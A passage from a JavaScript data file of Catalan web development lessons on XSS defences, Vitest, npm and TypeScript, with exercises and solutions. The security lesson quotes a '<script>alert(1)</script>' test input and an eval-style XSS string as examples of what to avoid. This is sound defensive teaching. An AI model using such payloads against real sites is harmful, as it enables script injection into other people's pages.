  ALLOWED_TAGS: ['p', 'strong', 'em', 'ul', 'li', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,
});`,
          codeTitle: "dompurify.js",
        },
        {
          title: "Altres bones pràctiques de seguretat",
          body: `
            <p>Més vectors d'atac i les seves defenses:</p>
          `,
          table: {
            head: ["Atac", "Descripció", "Defensa"],
            rows: [
              ["XSS reflectit", "Script a la URL executat immediatament", "Sanititzar output, CSP"],
              ["XSS emmagatzemat", "Script desat a la BD, executat a tots els usuaris", "Sanititzar input i output, CSP"],
              ["CSRF", "Peticions forjades des d'altra web", "CSRF tokens, SameSite cookies"],
              ["Clickjacking", "iframe invisible sobreposat", "X-Frame-Options: DENY, CSP frame-ancestors"],
              ["Prototype pollution", "Modificar Object.prototype via JSON", "Object.create(null), validació"],
            ],
          },
          lang: "js",
          code: `// Content Security Policy (CSP) via meta tag
// (millor via capçalera HTTP al servidor)
// <meta http-equiv="Content-Security-Policy"
//   content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'">

// Evitar eval i Function() amb strings
// MAL:
eval('console.log("hola")');           // executa strings com codi
new Function('return ' + json)();       // igual de perillós
setTimeout('alert("XSS")', 100);       // string evaluat!

// BÉ:
JSON.parse(json);                        // parse segur
setTimeout(() => alert('OK'), 100);     // funció, no string

// Atributs segurs vs perillosos
// MAL: assignar directament de dades d'usuari
element.setAttribute('href', urlUsuari); // pot ser javascript:...
element.setAttribute('src', urlUsuari);

// BÉ: validar protocols
function urlSegura(url) {
  try {
    const u = new URL(url);
    return ['http:', 'https:'].includes(u.protocol) ? url : '#';
  } catch { return '#'; }
}
element.setAttribute('href', urlSegura(urlUsuari));`,
          codeTitle: "seguretat-bones-practiques.js",
        },
      ],
      exercise: {
        brief: `<p>Crea un sistema de comentaris segur:</p>
<ul>
  <li>Un input de text i botó per afegir comentaris</li>
  <li>Els comentaris es mostren en una llista</li>
  <li>Cada comentari té el text, l'autor i un botó d'eliminar</li>
  <li>El text mai s'injecta com a innerHTML cru (usa textContent o createElement)</li>
  <li>Si l'usuari escriu <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, s'ha de mostrar com a text literal, no executar-se</li>
  <li>Desa els comentaris a localStorage de forma segura</li>
</ul>`,
        hint: `<p>Usa sempre <code>createElement + textContent</code> en lloc d'<code>innerHTML</code> per a les dades d'usuari. Per a l'estructura del comentari, crea els nodes manualment: <code>const div = document.createElement('div'); const p = document.createElement('p'); p.textContent = comentari.text;</code></p>`,
        solution: `<pre><code>function crearComentariEl(comentari) {
  const article = document.createElement('article');
  const autor = document.createElement('strong');
  autor.textContent = comentari.autor; // segur: textContent
  const text = document.createElement('p');
  text.textContent = comentari.text;   // segur: textContent
  const btn = document.createElement('button');
  btn.textContent = 'Eliminar';
  btn.onclick = () => { eliminarComentari(comentari.id); article.remove(); };
  article.append(autor, text, btn);
  return article;
}
// Mai: article.innerHTML = \`...\${comentari.text}...\`;</code></pre>`,
      },
    },

    {
      slug: "testing-vitest",
      title: "Testing amb Vitest",
      summary:
        "Escriure tests unitaris i d'integració amb Vitest: el framework de testing modern per a projectes Vite.",
      goals: [
        "Configurar Vitest en un projecte.",
        "Escriure tests unitaris amb <code>test()</code>, <code>expect()</code> i matchers.",
        "Organitzar tests amb <code>describe()</code>.",
        "Fer mocking de funcions i mòduls.",
      ],
      sections: [
        {
          title: "Configuració i primers tests",
          body: `
            <p>Vitest és el framework de testing oficial per a Vite. Reutilitza la mateixa configuració, és extremadament ràpid i compatible amb l'API de Jest.</p>
            <pre><code>npm install -D vitest</code></pre>
            <p>Afegeix a <code>package.json</code>: <code>"test": "vitest"</code></p>
          `,
          lang: "js",
          code: `// lib/matematiques.js
export function sumar(a, b) { return a + b; }
export function multiplicar(a, b) { return a * b; }
export function dividir(a, b) {
  if (b === 0) throw new Error('Divisió per zero');
  return a / b;
}
export function esPrimer(n) {
  if (n < 2) return false;
  for (let i = 2; i <= Math.sqrt(n); i++) {
    if (n % i === 0) return false;
  }
  return true;
}

// lib/matematiques.test.js
import { describe, test, expect } from 'vitest';
import { sumar, multiplicar, dividir, esPrimer } from './matematiques.js';

describe('sumar', () => {
  test('suma dos positius', () => {
    expect(sumar(2, 3)).toBe(5);
  });
  test('suma amb negatiu', () => {
    expect(sumar(-1, 5)).toBe(4);
  });
  test('suma zeros', () => {
    expect(sumar(0, 0)).toBe(0);
  });
});

describe('dividir', () => {
  test('divisió normal', () => {
    expect(dividir(10, 2)).toBe(5);
  });
  test('llança error en divisió per zero', () => {
    expect(() => dividir(10, 0)).toThrow('Divisió per zero');
  });
});

describe('esPrimer', () => {
  test.each([
    [2, true], [3, true], [5, true], [7, true],
    [1, false], [4, false], [9, false], [0, false],
  ])('esPrimer(%i) → %s', (n, resultat) => {
    expect(esPrimer(n)).toBe(resultat);
  });
});`,
          codeTitle: "matematiques.test.js",
        },
        {
          title: "Matchers i assertions",
          body: `
            <p>Vitest inclou tots els matchers de Jest i molts més. Els més habituals:</p>
          `,
          lang: "js",
          code: `import { expect, test } from 'vitest';

test('matchers comuns', () => {
  // Igualtat
  expect(2 + 2).toBe(4);           // === estricta
  expect({a: 1}).toEqual({a: 1}); // comparació profunda

  // Veritat
  expect(true).toBeTruthy();
  expect(null).toBeFalsy();
  expect(null).toBeNull();
  expect(undefined).toBeUndefined();

  // Números
  expect(0.1 + 0.2).toBeCloseTo(0.3, 5);
  expect(5).toBeGreaterThan(3);
  expect(2).toBeLessThanOrEqual(2);

  // Strings
  expect('hola món').toContain('món');
  expect('hola').toMatch(/^hol/);
  expect('error!').toMatch('error');

  // Arrays
  expect([1, 2, 3]).toContain(2);
  expect([1, 2, 3]).toHaveLength(3);
  expect([1, 2, 3]).toEqual(expect.arrayContaining([1, 3]));

  // Objectes
  expect({a: 1, b: 2}).toMatchObject({a: 1}); // subconjunt
  expect({a: 1}).toHaveProperty('a', 1);

  // Errors
  expect(() => { throw new Error('ups') }).toThrow('ups');
  expect(() => { throw new TypeError('tipus') }).toThrow(TypeError);

  // Negar qualsevol matcher
  expect(1).not.toBe(2);
  expect([]).not.toContain(5);
});`,
          codeTitle: "matchers.test.js",
        },
        {
          title: "Mocking amb vi.fn() i vi.mock()",
          body: `
            <p>El mocking substitueix dependències (fetch, timers, mòduls) per valors controlats en els tests, aïllant la unitat que volem testar.</p>
          `,
          lang: "js",
          code: `import { describe, test, expect, vi, beforeEach } from 'vitest';

// Mock d'una funció
describe('vi.fn()', () => {
  test('funcions mock', () => {
    const callback = vi.fn();
    callback('a');
    callback('b');

    expect(callback).toHaveBeenCalledTimes(2);
    expect(callback).toHaveBeenCalledWith('a');
    expect(callback).toHaveBeenLastCalledWith('b');
  });

  test('mock amb implementació', () => {
    const sumar = vi.fn((a, b) => a + b);
    expect(sumar(2, 3)).toBe(5);
    expect(sumar).toHaveBeenCalledWith(2, 3);
  });
});

// Mock de fetch
describe('fetch mock', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  test('carregarUsuari crida fetch i retorna dades', async () => {
    const usuariMock = { id: 1, nom: 'Anna' };

    global.fetch = vi.fn().mockResolvedValue({
      ok: true,
      json: () => Promise.resolve(usuariMock),
    });

    const { carregarUsuari } = await import('./api.js');
    const usuari = await carregarUsuari(1);

    expect(fetch).toHaveBeenCalledWith('/api/usuaris/1');
    expect(usuari).toEqual(usuariMock);
  });
});

// Mock de timers
test('setTimeout mock', () => {
  vi.useFakeTimers();
  const fn = vi.fn();
  setTimeout(fn, 1000);

  expect(fn).not.toHaveBeenCalled();
  vi.advanceTimersByTime(1000);
  expect(fn).toHaveBeenCalledOnce();

  vi.useRealTimers();
});`,
          codeTitle: "mocking.test.js",
        },
      ],
      exercise: {
        brief: `<p>Escriu tests per a un mòdul <code>lib/carret.js</code> que gestiona un carret de compra. El mòdul ha d'exportar:</p>
<ul>
  <li><code>crearCarret()</code>: retorna un carret buit <code>{ items: [], total: 0 }</code></li>
  <li><code>afegirItem(carret, item)</code>: retorna nou carret amb l'item afegit (immutable)</li>
  <li><code>eliminarItem(carret, id)</code>: retorna nou carret sense l'item</li>
  <li><code>calcularTotal(carret)</code>: suma preu * quantitat de cada item</li>
  <li><code>aplicarDescompte(carret, percent)</code>: retorna total amb descompte (llança error si percent < 0 o > 100)</li>
</ul>
<p>Escriu almenys 12 tests que cobreixin casos normals, casos límit i errors.</p>`,
        hint: `<p>Recorda testar: carret buit, afegir un/múltiples items, eliminar item existent/inexistent, total amb items de quantitat > 1, descompte del 0%, 100% i percentatges invàlids. Usa <code>test.each</code> per a múltiples casos de descompte.</p>`,
        solution: `<pre><code>import { describe, test, expect } from 'vitest';
import { crearCarret, afegirItem, eliminarItem, calcularTotal, aplicarDescompte } from './carret.js';

describe('carret', () => {
  test('carret buit', () => expect(crearCarret()).toEqual({ items: [], total: 0 }));
  test('afegir item', () => {
    const c = afegirItem(crearCarret(), { id: 1, nom: 'Prod', preu: 10, quantitat: 2 });
    expect(c.items).toHaveLength(1);
  });
  test('calcularTotal', () => {
    let c = crearCarret();
    c = afegirItem(c, { id: 1, preu: 10, quantitat: 3 });
    expect(calcularTotal(c)).toBe(30);
  });
  test.each([[0, 30], [50, 15], [100, 0]])('descompte %i%% = %i', (p, expected) => {
    let c = afegirItem(crearCarret(), { id: 1, preu: 10, quantitat: 3 });
    expect(aplicarDescompte(c, p)).toBe(expected);
  });
  test('descompte invàlid llança error', () => {
    expect(() => aplicarDescompte(crearCarret(), -1)).toThrow();
  });
});</code></pre>`,
      },
    },

    {
      slug: "npm-paquets",
      title: "Gestió de paquets amb npm",
      summary:
        "Treballar amb npm: instal·lar paquets, gestionar versions, scripts i publicar al registre.",
      goals: [
        "Entendre <code>package.json</code> i el versionat semàntic.",
        "Distingir dependencies de devDependencies.",
        "Crear i executar scripts npm.",
        "Usar npx i gestionar vulnerabilitats.",
      ],
      sections: [
        {
          title: "package.json i versionat semàntic",
          body: `
            <p><code>package.json</code> és el fitxer de configuració del projecte. Registra metadades, dependències i scripts.</p>
            <p>El <strong>versionat semàntic (semver)</strong>: <code>MAJOR.MINOR.PATCH</code>. Exemples de rangs:</p>
          `,
          table: {
            head: ["Símbol", "Exemple", "Accepta"],
            rows: [
              ["^", "^1.2.3", "1.x.x (canvis menors i patches)"],
              ["~", "~1.2.3", "1.2.x (només patches)"],
              ["*", "*", "Qualsevol versió"],
              ["(exacte)", "1.2.3", "Exactament 1.2.3"],
              [">=", ">=1.2.0", "Versió mínima"],
            ],
          },
          lang: "json",
          code: `{
  "name": "la-meva-app",
  "version": "1.0.0",
  "description": "Una aplicació web moderna",
  "main": "src/index.js",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview",
    "test": "vitest",
    "test:ui": "vitest --ui",
    "lint": "eslint src/",
    "format": "prettier --write src/",
    "clean": "rm -rf dist node_modules/.cache"
  },
  "dependencies": {
    "dompurify": "^3.1.0"
  },
  "devDependencies": {
    "vite": "^5.0.0",
    "vitest": "^1.0.0",
    "eslint": "^8.0.0",
    "prettier": "^3.0.0"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}`,
          codeTitle: "package.json",
        },
        {
          title: "Comandes essencials de npm",
          body: `
            <p>Les comandes més habituals en el flux de treball diari:</p>
          `,
          lang: "js",
          code: `// INSTAL·LACIÓ
// npm install          → instal·la totes les deps de package.json
// npm install lodash   → afegeix a dependencies
// npm install -D vitest → afegeix a devDependencies
// npm install -g nodemon → instal·la globalment (evitar-ho si és possible)

// VERSIONS
// npm install react@18.2.0  → versió exacta
// npm install react@latest  → última versió
// npm update               → actualitza dins dels rangs de semver
// npm outdated             → mostra paquets desactualitzats

// SCRIPTS
// npm run dev      → executa el script "dev"
// npm test         → drecera per a "test" (sense run)
// npm start        → drecera per a "start"
// npm run build    → executa el script "build"

// INFORMACIÓ
// npm ls           → arbre de dependències
// npm ls --depth=0 → dependències directes
// npm info vite    → informació d'un paquet
// npm docs vite    → obre la documentació al navegador

// SEGURETAT
// npm audit        → comprova vulnerabilitats conegudes
// npm audit fix    → intenta corregir automàticament

// NETEJA
// npm cache clean --force  → buida la caché
// rm -rf node_modules && npm install  → reinstal·lar tot

// NPX: executar sense instal·lar
// npx create-vite meva-app   → crear projecte sense instal·lar create-vite
// npx prettier --write .     → executar prettier sense instal·lar-lo globalment`,
          codeTitle: "npm-comandes.sh",
          lang: "js",
        },
        {
          title: "Scripts avançats i variables d'entorn",
          body: `
            <p>Els scripts de <code>package.json</code> poden encadenar-se, usar variables d'entorn i tenir scripts de pre/post que s'executen automàticament.</p>
          `,
          lang: "json",
          code: `{
  "scripts": {
    "prebuild": "npm run lint && npm run test",
    "build": "vite build",
    "postbuild": "echo 'Build completat!'",

    "dev": "NODE_ENV=development vite",
    "dev:staging": "NODE_ENV=staging vite --port 3001",

    "test": "vitest run",
    "test:watch": "vitest",
    "test:coverage": "vitest run --coverage",

    "lint": "eslint src/ --ext .js,.jsx",
    "lint:fix": "eslint src/ --ext .js,.jsx --fix",

    "format": "prettier --write 'src/**/*.{js,jsx,css}'",
    "format:check": "prettier --check 'src/**/*.{js,jsx,css}'",

    "deploy": "npm run build && netlify deploy --prod --dir=dist",

    "clean": "rimraf dist .cache",
    "reset": "npm run clean && rimraf node_modules && npm install"
  }
}`,
          codeTitle: "scripts-avancats.json",
        },
      ],
      exercise: {
        brief: `<p>Configura un projecte des de zero amb npm:</p>
<ul>
  <li>Inicialitza <code>npm init -y</code> i edita el <code>package.json</code></li>
  <li>Afegeix Vite com a devDependency i DOMPurify com a dependency</li>
  <li>Configura scripts: dev, build, preview, test (vitest), lint (eslint), format (prettier)</li>
  <li>Afegeix scripts pre-build que executin lint i test</li>
  <li>Crea un fitxer <code>.nvmrc</code> amb la versió de Node (18 LTS) i un <code>.npmrc</code> amb <code>save-exact=true</code></li>
  <li>Executa <code>npm audit</code> i documenta els passos per resoldre vulnerabilitats</li>
</ul>`,
        hint: `<p><code>save-exact=true</code> al <code>.npmrc</code> fa que npm desi les versions exactes (sense ^) per defecte. <code>.nvmrc</code> conté simplement <code>18</code> o <code>18.19.0</code>. Per a pre-build: el script s'anomena exactament <code>prebuild</code> (sense espai).</p>`,
        solution: `<pre><code>// package.json
{
  "name": "projecte",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview",
    "test": "vitest run",
    "lint": "eslint src/",
    "format": "prettier --write src/",
    "prebuild": "npm run lint && npm run test"
  },
  "dependencies": { "dompurify": "3.1.0" },
  "devDependencies": { "vite": "5.0.0", "vitest": "1.0.0", "eslint": "8.0.0" }
}
// .nvmrc: 18
// .npmrc: save-exact=true</code></pre>`,
      },
    },

    {
      slug: "intro-typescript",
      title: "Introducció a TypeScript",
      summary:
        "Els fonaments de TypeScript: tipat estàtic, inferència, interfaces i genèrics per escriure JavaScript més robust.",
      goals: [
        "Entendre per què TypeScript millora la qualitat del codi.",
        "Anotar variables, paràmetres i retorns de funció.",
        "Definir interfaces i type aliases.",
        "Usar genèrics per a funcions reutilitzables.",
      ],
      sections: [
        {
          title: "Tipus bàsics i inferència",
          body: `
            <p>TypeScript afegeix tipat estàtic a JavaScript. Els tipus es comproven en temps de compilació, no d'execució. TypeScript <em>infereix</em> molts tipus automàticament sense que els escriguis.</p>
            <p>Compilació: <code>tsc fitxer.ts</code> → genera <code>fitxer.js</code>. Amb Vite, el suport és transparent.</p>
          `,
          lang: "js",
          code: `// Variables: inferència automàtica
let nom = 'Anna';    // TypeScript infereix: string
let edat = 25;       // number
let actiu = true;    // boolean

// Anotació explícita (quan cal)
let puntuacio: number;
puntuacio = 100;
// puntuacio = 'cent'; // ERROR en temps de compilació!

// Tipus bàsics
let text: string = 'hola';
let numero: number = 42;
let boolea: boolean = false;
let res: null = null;
let indefinit: undefined = undefined;
let qualsevol: any = 'tot val'; // evitar any!
let desconegut: unknown = 'val'; // millor que any (cal comprovar)

// Arrays
let nombres: number[] = [1, 2, 3];
let paraules: Array<string> = ['hola', 'món'];

// Tupla: array de longitud i tipus fixos
let coordenades: [number, number] = [41.38, 2.17];
let entrada: [string, number] = ['Anna', 25];

// Union types: un valor pot ser de diversos tipus
let id: string | number;
id = '123';
id = 123;

// Literal types: valors concrets
let direccio: 'nord' | 'sud' | 'est' | 'oest';
direccio = 'nord';
// direccio = 'diagonal'; // ERROR!`,
          codeTitle: "tipus-basics.ts",
        },
        {
          title: "Funcions tipades",
          body: `
            <p>Anotar els paràmetres i el tipus de retorn de les funcions és la part més important de TypeScript: documenta l'API i prevé errors.</p>
          `,
          lang: "js",
          code: `// Paràmetres i retorn
function sumar(a: number, b: number): number {
  return a + b;
}

// Arrow functions
const multiplicar = (a: number, b: number): number => a * b;

// Paràmetres opcionals (?) i per defecte
function saludar(nom: string, salutacio: string = 'Hola'): string {
  return \`\${salutacio}, \${nom}!\`;
}

function registrar(nom: string, edat?: number): void {
  console.log(nom, edat ?? 'edat desconeguda');
}

// Retorn void (sense retorn)
function log(missatge: string): void {
  console.log(missatge);
}

// Retorn never (mai acaba)
function llancaError(msg: string): never {
  throw new Error(msg);
}

// Paràmetres rest
function sumarTots(...nums: number[]): number {
  return nums.reduce((acc, n) => acc + n, 0);
}

// Funcions com a tipus
type Callback = (error: Error | null, resultat?: string) => void;

function peticio(url: string, cb: Callback): void {
  fetch(url)
    .then(r => r.text())
    .then(text => cb(null, text))
    .catch(err => cb(err));
}`,
          codeTitle: "funcions-ts.ts",
        },
        {
          title: "Interfaces, type aliases i genèrics",
          body: `
            <p><strong>Interfaces</strong> i <strong>type aliases</strong> defineixen l'estructura d'objectes. Els <strong>genèrics</strong> creen funcions i classes reutilitzables per a qualsevol tipus.</p>
          `,
          lang: "js",
          code: `// Interface: estructura d'un objecte
interface Usuari {
  id: number;
  nom: string;
  email: string;
  avatar?: string;        // opcional
  readonly createdAt: Date; // només lectura
}

// Type alias: equivalent (preferit per unions/interseccions)
type Producte = {
  id: string;
  nom: string;
  preu: number;
  categoria: 'electrònica' | 'roba' | 'llar';
};

// Usar les interfaces
function mostrarUsuari(user: Usuari): string {
  return \`\${user.nom} (\${user.email})\`;
}

// Intersecció de tipus
type Admin = Usuari & { permisos: string[] };

// Genèrics: funcions reutilitzables
function primerElement<T>(array: T[]): T | null {
  return array.length > 0 ? array[0] : null;
}

primerElement([1, 2, 3]);     // retorna number | null
primerElement(['a', 'b']);    // retorna string | null
primerElement<Usuari>([...]);  // retorna Usuari | null

// Genèric amb restricció
function getPropieta<T, K extends keyof T>(obj: T, clau: K): T[K] {
  return obj[clau];
}
const user: Usuari = { id: 1, nom: 'Anna', email: 'a@a.com', createdAt: new Date() };
getPropieta(user, 'nom');  // string
// getPropieta(user, 'xyz'); // ERROR: 'xyz' no existeix a Usuari

// Tipus utilitaris integrats
type UsuariParcial = Partial<Usuari>;      // tots els camps opcionals
type UsuariRequerit = Required<Usuari>;    // tots els camps requerits
type UsuariLlegible = Readonly<Usuari>;    // tots readonly
type NomEmail = Pick<Usuari, 'nom' | 'email'>; // subconjunt
type SenseId = Omit<Usuari, 'id'>;        // exclou camps`,
          codeTitle: "interfaces-generics.ts",
        },
      ],
      exercise: {
        brief: `<p>Converteix el sistema de tasques de l'exercici anterior (<code>lib/tasques.js</code>) a TypeScript:</p>
<ul>
  <li>Defineix una interface <code>Tasca</code> amb: id (number), text (string), feta (boolean), prioritat ('alta' | 'mitja' | 'baixa'), creada (Date), etiquetes (string[])</li>
  <li>Defineix un type <code>Carret</code> amb: items (Tasca[]), total (number)</li>
  <li>Tipa totes les funcions (<code>crearTasca</code>, <code>marcarFeta</code>, etc.)</li>
  <li>Crea una funció genèrica <code>filtrar<T>(array: T[], predicat: (item: T) => boolean): T[]</code></li>
  <li>Usa tipus utilitaris: <code>Partial&lt;Tasca&gt;</code> per a l'actualització parcial</li>
</ul>`,
        hint: `<p>Per a <code>crearTasca</code>, el paràmetre d'entrada pot ser <code>Omit&lt;Tasca, 'id' | 'creada' | 'feta'&gt;</code> perquè l'id i la data es generen internament. El retorn és sempre <code>Tasca</code>.</p>`,
        solution: `<pre><code>interface Tasca {
  id: number;
  text: string;
  feta: boolean;
  prioritat: 'alta' | 'mitja' | 'baixa';
  creada: Date;
  etiquetes: string[];
}

function crearTasca(dades: Omit&lt;Tasca, 'id' | 'creada' | 'feta'&gt;): Tasca {
  return { ...dades, id: Date.now(), feta: false, creada: new Date() };
}

function marcarFeta(tasques: Tasca[], id: number): Tasca[] {
  return tasques.map(t => t.id === id ? { ...t, feta: !t.feta } : t);
}

function filtrar&lt;T&gt;(array: T[], predicat: (item: T) =&gt; boolean): T[] {
  return array.filter(predicat);
}

const tascaAlta = filtrar(tasques, t =&gt; t.prioritat === 'alta');</code></pre>`,
      },
    },
  ],
};

